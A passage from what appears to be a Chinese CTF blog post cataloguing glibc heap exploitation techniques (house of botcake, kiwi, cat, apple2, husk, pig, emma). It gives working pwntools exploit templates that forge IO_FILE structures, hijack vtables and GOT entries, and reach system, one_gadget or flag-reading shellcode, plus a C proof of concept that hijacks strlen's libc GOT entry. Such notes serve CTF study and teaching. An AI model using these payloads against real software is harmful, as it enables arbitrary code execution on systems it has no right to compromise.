class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x407</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x4f7</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x407</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">0x400</span> + p64(<span class="number">0x410</span>*<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x410</span>*<span class="number">2</span>+<span class="number">1</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))  <span class="comment"># 在chunk1中伪造一个fake chunk0x820</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>chunk1的中间部分+chunk2+chunk3进行合并</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>通常在存在<code>UAF</code>漏洞，但只能对其进行<code>delete</code>操作时使用<br>利用步骤<br>1、先将<code>tcache bin</code>填满（大小要大于<code>0x80</code>）<br>2、再连续<code>free</code>两个连着的堆块（<code>A</code>在<code>B</code>的上方，<code>A</code>不能进入<code>tcache bin</code> 且 <code>B</code>的大小要与第一步<code>tcache bin</code>中的相等），使其合并后进入<code>unsorted bin</code><br>3、从<code>tcache bin</code>中取出一个堆块，空出一个位置<br>4、将<code>Chunk B</code>利用<code>UAF</code>漏洞，再次释放到<code>tcache bin</code>中，并申请回<code>unsorted bin</code>中的<code>Chunk A &amp; B</code>合并的大堆块（部分），修改<code>Chunk B</code>的<code>next</code>指针指向任意地址，并申请到任意地址的控制权</p>
<h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi(&lt;&#x3D; 2.36)"></a>house of kiwi(&lt;&#x3D; 2.36)</h3><ul>
<li>将<code>_IO_file_jumps</code>中的<code>_IO_new_file_sync</code>修改为<code>setcontext + 61</code> 注意：该<code>_IO_file_jumps</code>位于<code>stderr</code>中</li>
<li>其中<code>rdx</code>指向<code>_IO_helper_jumps_addr</code>，<code>rdi</code>指向<code>_IO_2_1_stderr_addr</code></li>
<li>可以通过在<code>_IO_helper_jumps_addr + 0xA0</code>的位置写入<code>rop</code>链也可以通过在<code>libc</code>中找<code>gadget</code>将<code>rdi</code>转移到<code>rbx</code>中</li>
<li>通过<code>__malloc_assert</code>触发该攻击</li>
</ul>
<h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><ul>
<li>依旧为将<code>stderr</code>所指向的区域伪造一个<code>fake_io_file</code></li>
<li>利用模板</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addrA</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>

<ul>
<li>size为<code>0x118</code></li>
</ul>
<p>模板二：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x30</span>: call,  <span class="comment"># ogg/setcontext</span></span><br><span class="line">    <span class="number">0x40</span>: rbx,   </span><br><span class="line">    <span class="number">0x78</span>: writeable,   </span><br><span class="line">    <span class="number">0x90</span>: fake_addr + <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0xc8</span>: IO_wfile_jumps + <span class="number">0x10</span>,  <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0xf8</span>: fake_add + <span class="number">0x28</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment"># 不包括io_file的前0x10字节</span></span><br></pre></td></tr></table></figure>

<ul>
<li>最终通过<code>_malloc_assert</code>来触发攻击<br>从<code>2.36</code>版本开始，删除了<code>_malloc_assert</code>对<code>stderr</code>的刷新，因此通过该方法触发攻击的手段生效，但可以使用<code>fsop</code>的方法来触发攻击(<code>FSOP</code>需将<code>vtable</code>改为<code>IO_wfile_jumps+0x30</code>,并且要将<code>_IO_list_all</code>指向可控的<code>fake_file</code>地址)</li>
</ul>
<h3 id="house-of-秦月汉关"><a href="#house-of-秦月汉关" class="headerlink" title="house of 秦月汉关"></a>house of 秦月汉关</h3><p>修改<code>libc</code>中的部分<code>got.plt</code>节来执行我们想要的函数</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>puts函数调用时会隐式的调用<code>strlen</code>函数，而<code>strlen</code>函数的<code>got.plt</code>节在<code>libc</code>中，如果我们将<code>strlen</code>的<code>got.plt</code>中的内容改为<code>system</code>函数的地址，那么执行<code>puts(&quot;/bin/sh&quot;)-&gt;strlen(&quot;/bin/sh&quot;)</code>就会变成<code>puts(&quot;/bin/sh&quot;)-&gt;system(&quot;/bin/sh&quot;)</code>进而<code>getshell</code><br>poc:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> puts_offset = <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base_addr = (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;<span class="built_in">puts</span> - puts_offset;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> strlen_addr  = libc_base_addr + <span class="number">0x19d960</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_addr = libc_base_addr  + <span class="number">0x50d60</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *strlen_got_plt_addr= (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(libc_base_addr + <span class="number">0x219098</span> );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;输出/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *strlen_got_plt_addr = system_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;取得shell&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><p>主要是因为系统没有对<code>wfile_vtable</code>中函数指针的合法性进行检测，导致可以让我们进行利用<br>利用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure>
<p>在<code>_IO_2_1_stderr_</code>的位置伪造一个<code>fake_file</code><br>Csome版<code>fake_file</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: system,</span><br><span class="line">    <span class="number">0x88</span>: libc_base+<span class="number">0x2008f0</span>,  <span class="comment">#lock writable addr</span></span><br><span class="line">    <span class="number">0xa0</span>: stderr-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>通过<code>exit</code>或者主函数返回触发该攻击<br>改方法也可以用于打<code>rop</code>，将<code>0x28</code>处设置为<code>magic gadget</code>的地址，<code>0x0</code>处布置好内容用于将指定的地址设置进<code>rbx</code>中并使<code>rip</code>能够指向<code>setcontext+61</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stderr-0x40+0x18 == 0 -&gt; FILE-&gt;_wide_data-&gt;_IO_wirite_base == 0  </span></span><br><span class="line"><span class="comment"># stderr-0x40+0x30 == 0 -&gt; FILE-&gt;_wide_data-&gt;_IO_buf_base == 0</span></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0</span>,    <span class="comment"># flag &amp; 8 ==0 &amp;&amp; flag &amp; 0x800 == &amp;&amp; FILE-&gt;flags &amp; 2 ==0</span></span><br><span class="line">    <span class="number">0x8</span>: stderr-<span class="number">0x10</span>,    <span class="comment"># magic_gadget move rdx, [rdi+8]</span></span><br><span class="line">    <span class="number">0x10</span>: setcontext,    <span class="comment"># magic call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>,    <span class="comment"># FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: magic_gadget,    <span class="comment"># (target code addr)fake _wide_vtable-&gt;_IO_wdoallocbuf</span></span><br><span class="line">    <span class="number">0x58</span>: stderr &amp; (~<span class="number">0xfff</span>),    <span class="comment"># set rdi</span></span><br><span class="line">    <span class="number">0x60</span>: <span class="number">0x1000</span>,    <span class="comment"># set rsi</span></span><br><span class="line">    <span class="number">0x78</span>: <span class="number">7</span>,    <span class="comment"># set rdx</span></span><br><span class="line">    <span class="number">0x90</span>: stderr+<span class="number">0xe0</span>,    <span class="comment"># set rsp</span></span><br><span class="line">    <span class="number">0x98</span>: mprotect,    <span class="comment"># set rcx (first jmp)</span></span><br><span class="line">    <span class="number">0xa0</span>: stderr-<span class="number">0x40</span>,    <span class="comment"># reuse _wide_data</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># _IO_wfile_jumps</span></span><br><span class="line">    <span class="number">0xe0</span>: [    <span class="comment"># ROPstart</span></span><br><span class="line">        pop_rax_call_rax,</span><br><span class="line">        stderr+<span class="number">0xf0</span>,</span><br><span class="line">    ], </span><br><span class="line">    <span class="number">0xf0</span>: asm(    <span class="comment"># shellcode start</span></span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><p>改方法主要是利用<code>printf</code>函数在进行格式化字符串时会调用<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>中的函数指针所指向的函数，此时我我们可以劫持这2个指针所以指向的地址，然后在该地址中写入<code>ogg</code>的地址，在下次调用<code>printf</code>函数时即可<code>getshell</code><br>这里要注意，在进行格式化字符串时操作系统会对这两个指针判断是否空，如果为空则会调用<code>calloc</code>来分配内存来给这两个表，其中每一个表的大小都为<code>0x100</code>.需要注意的是，在我们伪造的表中，格式化字符所对应的函数指针要么是<code>0</code>，要么是一个合法的地址<br>假设现在<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>分别被填上了<code>chunk 4</code>与<code>chunk 8</code>的堆块地址（<code>chunk header</code>）<br>方法一：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6c7e</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure>
<p>由于有堆块头，所以格式化字符的索引要减<code>2</code>，这样写就满足了<code>__printf_function_table</code>不为空，进入了<code>printf_positional</code>函数，并调用了<code>__printf_arginfo_table</code>中的函数指针<br>方法二：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6ed8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure>
<p>__printf_arginfo_table和__printf_function_table的地址可以直接通过<code>p &amp;</code>来查找<br>可以利用下面这个函数来查找相关地址：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数 <code>vfprintf</code> 中的部分源码：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">        || __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">        || __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">	<span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">		   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">		    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h3><p>主要是利用<code>_IO_str_overflow</code>这个<code>io</code>函数，该函数中可以完成<code>malloc</code>、<code>memcpy</code>、<code>free</code>一条龙服务<br>且该函数汇编中存在下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e2f0dd &lt;+61&gt;:    mov    rdx,QWORD PTR [rdi+0x28]</span><br></pre></td></tr></table></figure>
<p>rdi指向<code>IO_FILE</code>结构体首地址，可以方便我们来通过<code>setcontext+61</code>来打<code>srop</code><br>高版本没有<code>hook</code>函数，可是<code>_IO_str_overflow</code>中存在<code>memset</code>函数的调用，而且该函数的<code>got</code>表在<code>glibc</code>，<code>glibc</code>中的<code>got</code>表可写，所以可以修改<code>got</code>表来达到和<code>hook</code>相同的效果<br>fake_file</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在0xa0的tcache链表头伪造一个memset_got_addr的地址</span></span><br><span class="line"><span class="comment"># magic_gadget：mov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]</span></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(fake_stderr_addr+<span class="number">0xf0</span>) + p64(fake_stderr_addr+<span class="number">0x108</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># srop</span></span><br><span class="line">fake_stderr += p64(rop_address + <span class="number">0x10</span>) + p64(ret_addr) <span class="comment"># rsp rip</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc.sym[<span class="string">&#x27;_IO_str_jumps&#x27;</span>] - <span class="number">0x20</span>)</span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_stderr += p64(magic_gadget) + p64(<span class="number">0</span>) <span class="comment"># r14 r14+8</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span>) <span class="comment"># r14 + 0x38</span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，在<code>memset</code>之前仍然有<code>free(IO-&gt;buf_base)</code>，因此需要伪造一下<code>memset_got_addr</code>的<code>fake chunk</code>的堆块头，以及其<code>next chunk</code>的堆块头<br>最终通过<code>exit()</code>函数或者程序正常退出触发攻击</p>
<h3 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h3><p>house of emma主要利用了<code>_IO_cookie_jumps</code>这个<code>vtable</code><br>利用<code>house of KiWi</code>配合<code>house of emma</code>的调用链为<code>__malloc_assert</code> -&gt; <code>__fxprintf</code> -&gt; <code>__vfxprintf</code> -&gt; <code>locked_vfxprintf</code> -&gt; <code>__vfprintf_internal</code> -&gt; <code>_IO_new_file_xsputn</code> ( &#x3D;&gt; <code>_IO_cookie_write</code>)，这里用的是<code>_IO_cookie_write</code>函数，用其他的当然也同理<br>fs寄存器的值和地址可以通过<code>x/16gx pthread_self()</code>指令来查看<br>fake_file:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># __pointer_chk_guard为tls[0x30]处的值，用于对数据进行加密</span></span><br><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"> </span><br><span class="line">magic_gadget = libc.address + <span class="number">0x1460e0</span> <span class="comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line"></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_stderr += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += 